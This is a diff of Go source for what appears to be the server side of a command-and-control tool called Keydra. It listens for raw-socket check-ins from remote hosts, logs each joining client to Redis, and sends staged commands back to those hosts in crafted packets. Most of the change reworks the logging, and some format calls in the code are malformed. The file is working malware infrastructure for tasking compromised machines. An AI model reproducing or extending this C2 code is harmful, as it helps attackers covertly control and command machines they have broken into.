@@ -1,17 +1,13 @@
 package main
 
 import (
-	// "bufio"
 	"fmt"
 	"log"
 	"net"
-	"os"
+    "context"
 	"strconv"
 	"strings"
 	"time"
-	"io"
-	// "net/http"
-	"encoding/json"
 
 	"github.com/google/gopacket"
 	"github.com/DaveTheBearMan/Keydra/socket"
@@ -21,8 +17,8 @@ import (
 
 // Global to store staged command
 var stagedCmd string
-var startTime time.Time
-var rdb redis.Client
+var rdb *redis.Client
+var ctx = context.Background()
 
 // Glabal to store target info
 var targetIP string
@@ -39,10 +35,10 @@ type Host struct {
 }
 
 // Write host
-func writeLog(streamKey String, event String, message String) {
+func writeLog(streamKey string, event string, message string) {
 	args := &redis.XAddArgs{
         Stream: streamKey,
-        MaxLen: 1000,
+        MaxLen: 500,
         Approx: true,
         Values: map[string]interface{}{
             "event":   event,
@@ -70,12 +66,12 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		fd := socket.NewSocket()
 
 		// Create packet
-		// writeLog(fmt.Sprintf("SRC MAC:", iface.HardwareAddr)
-		// writeLog(fmt.Sprintf("DST MAC:", dstMAC)
-		// writeLog(fmt.Sprintf("SRC IP:", myIP)
-		// writeLog(fmt.Sprintf("DST IP:", client.RespIP)
+		// writeLog("Server", fmt.Sprintf("SRC MAC:", iface.HardwareAddr)
+		// writeLog("Server", fmt.Sprintf("DST MAC:", dstMAC)
+		// writeLog("Server", fmt.Sprintf("SRC IP:", myIP)
+		// writeLog("Server", fmt.Sprintf("DST IP:", client.RespIP)
 		if targetcommand != "" {
-			writeLog("TRAFFIC", fmt.Sprintf("Sending target cmd", targetIP, targetcommand))
+			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sending target cmd", targetIP, targetcommand))
 			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
 			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
 		} else {
@@ -84,7 +80,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		}
 		// YEET
 		if stagedCmd != "" {
-			writeLog("TRAFFIC", fmt.Sprintf("Sent reponse to:", client.Hostname, "(", client.IP, ")"))
+			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sent reponse to:", client.Hostname, "(", client.IP, ")"))
 			// Close the socket
 			unix.Close(fd)
 		} else {
@@ -99,12 +95,12 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	data := string(packet.ApplicationLayer().Payload())
 	payload := strings.Split(data, " ")
 
-	// writeLog(fmt.Sprintf("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
+	// writeLog("Server", fmt.Sprintf("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
 
 	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
 	if err != nil {
-		writeLog("ERROR", fmt.Sprintf("ERROR PARSING MAC:", err))
+		writeLog("Server", "ERROR", fmt.Sprintf("ERROR PARSING MAC:", err))
 		return
 	}
 
@@ -121,27 +117,18 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		DstPort:  dstport,
 	}
 
-	writeLog("TRAFFIC", fmt.Sprintf("Recieved From:", newHost.Hostname, "(", newHost.IP, ")"))
-	err = writeHostToFile(newHost)
-	if err != nil {
-		writeLog("ERROR", fmt.Sprintf("ERROR WRITING HOST:", err))
-		return
-	}
+	writeLog("Server", "TRAFFIC", fmt.Sprintf("Recieved From:", newHost.Hostname, "(", newHost.IP, ")"))
+	writeLog("Client", "JOIN", newHost.IP.String())
 
 	// Write host to channel
 	listen <- newHost
 }
 
-func connectToDb() {
-	rdb = redis.NewClient(&redis.Options{
-		Addr: "localhost:6379",
-	})
-}
+// func listenRedisStream() {
+	
+// }
 
 func initializeRawSocketServer() {
-	// Hosts file
-	startTime = time.now()
-	filePath = "hosts.json"
 	// Create a BPF vm for filtering
 	filterVM := socket.CreateBPFVM(socket.FilterRaw)
 
@@ -149,24 +136,27 @@ func initializeRawSocketServer() {
 	readfd := socket.NewSocket()
 	defer unix.Close(readfd)
 
-	writeLog("DEBUG", fmt.Sprintf("Created sockets"))
+	writeLog("Server", "DEBUG", fmt.Sprintf("Created sockets"))
 
 	// Make channel buffer by 5
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
 	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
-	writeLog("DEBUG", fmt.Sprintf("Interface:", iface.Name))
+	writeLog("Server", "DEBUG", fmt.Sprintf("Interface:", iface.Name))
 
 	dstMAC, err := socket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
-	writeLog("DEBUG", fmt.Sprintf("DST MAC:", dstMAC.String()))
+	writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC:", dstMAC.String()))
 
 	// Spawn routine to listen for responses
-	writeLog("DEBUG", "Starting go routine...")
+	writeLog("Server", "DEBUG", "Starting go routine...")
 	go sendCommand(iface, myIP, dstMAC, listen)
+
+	// Start listening to redis streams for commands
+	// go listenRedisStream()
 
 	// This needs to be on main thread
 	for {
@@ -179,5 +169,8 @@ func initializeRawSocketServer() {
 }
 
 func main() {
+	rdb = redis.NewClient(&redis.Options{ // Connect to local redis database
+		Addr: "localhost:6379",
+	})
 	initializeRawSocketServer()
 }
